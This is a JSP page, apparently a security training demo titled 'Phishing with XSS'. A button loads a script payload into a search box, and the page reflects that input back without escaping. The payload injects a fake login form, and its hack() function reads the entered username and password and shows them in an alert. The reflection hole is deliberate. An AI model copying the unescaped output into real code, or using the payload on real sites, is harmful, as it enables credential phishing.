<%@ page language="java" contentType="text/html; charset=GB18030"
    pageEncoding="GB18030"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=GB18030">
<title>Phishing with XSS</title>
<script>
	function getPhishingScript(){

		document.all.searchConditionText.value="<script>function hack(){ alert(\"Had this been a real attack... "+
		"Your credentials were just stolen. User Name = \" + document.forms[0].user.value + \"Password = \" + document.forms[0].pass.value);} "+
		"<\/script><form><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type=\"text\" id=\"user\""+
		" name=\"user\"><br>Enter Password:<br><input type=\"password\" name = \"pass\"><br><input type=\"submit\" name=\"login\" value=\"login\""+
		" onclick=\"hack()\"></form><br><br><HR>";
	}
</script>
</head>
<body>
<br/>
<form action="SearchAction" method="post">
	<table align="center">
		<tr>
			<td align="right">查询内容:</td>
			<td align="left"><input type="text" id="searchConditionText" name="searchCondition"></input>
			&nbsp;&nbsp;<input type="button" value="诱骗脚本" onclick="getPhishingScript()"/>
			</td>
		</tr>
		<tr>
			<td>&nbsp;</td>
			<td><input type="submit" value="查询"></input></td>
		</tr>
		<tr>
			<td colspan="2">
				<%=request.getAttribute("searchCondition")==null?"":request.getAttribute("searchCondition")%>;

			</td>
		</tr>
	</table>
</form>
<jsp:include page="foot.jsp" />
</body>
</html>